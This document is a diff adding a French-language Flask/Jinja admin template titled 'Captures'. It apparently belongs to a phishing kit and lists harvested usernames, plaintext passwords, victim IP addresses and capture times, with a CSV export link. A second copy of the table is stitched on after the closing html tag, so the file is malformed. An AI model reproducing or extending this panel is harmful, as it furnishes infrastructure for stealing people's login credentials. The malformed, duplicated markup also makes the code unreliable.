@@ -1,0 +1,62 @@
+<!doctype html>
+<html lang="fr">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta name="robots" content="noindex, nofollow">
+  <title>Captures</title>
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}">
+</head>
+<body class="page-admin">
+  <main class="admin-large">
+    <header class="admin-tete">
+      <h1>Captures <span class="badge">{{ total }}</span></h1>
+      <nav>
+        <a class="btn-mini" href="/admin/export.csv">CSV</a>
+        <a class="btn-mini" href="/">Login</a>
+      </nav>
+    </header>
+
+    <table>
+      <thead>
+        <tr><th>#</th><th>Identifiant</th><th>Mot de passe</th><th>Débloqué</th><th>IP</th><th>Reçu</th></tr>
+      </thead>
+      <tbody>
+        {% for e in entrees %}
+        <tr>
+          <td class="num">{{ e['id'] }}</td>
+          <td>{{ e['identifiant'] }}</td>
+          <td class="mono">{{ e['mot_de_passe'] }}</td>
+          <td>{{ 'oui' if e['debloque'] else '—' }}</td>
+          <td class="num">{{ e['ip'] }}</td>
+          <td class="num">{{ e['recu_le'] }}</td>
+        </tr>
+        {% else %}
+        <tr><td colspan="6" class="vide">Aucune capture.</td></tr>
+        {% endfor %}
+      </tbody>
+    </table>
+  </main>
+</body>
+</html>
+<div class="tableau-scroll">
+      <table>
+        <thead>
+          <tr><th>#</th><th>Identifiant</th><th>Mot de passe</th><th>Débloqué</th><th>IP</th><th>Reçu</th></tr>
+        </thead>
+        <tbody>
+          {% for e in entrees %}
+          <tr>
+            <td class="num">{{ e['id'] }}</td>
+            <td>{{ e['identifiant'] }}</td>
+            <td class="mono">{{ e['mot_de_passe'] }}</td>
+            <td>{{ 'oui' if e['debloque'] else '—' }}</td>
+            <td class="num">{{ e['ip'] }}</td>
+            <td class="num">{{ e['recu_le'] }}</td>
+          </tr>
+          {% else %}
+          <tr><td colspan="6" class="vide">Aucune capture.</td></tr>
+          {% endfor %}
+        </tbody>
+      </table>
+    </div>
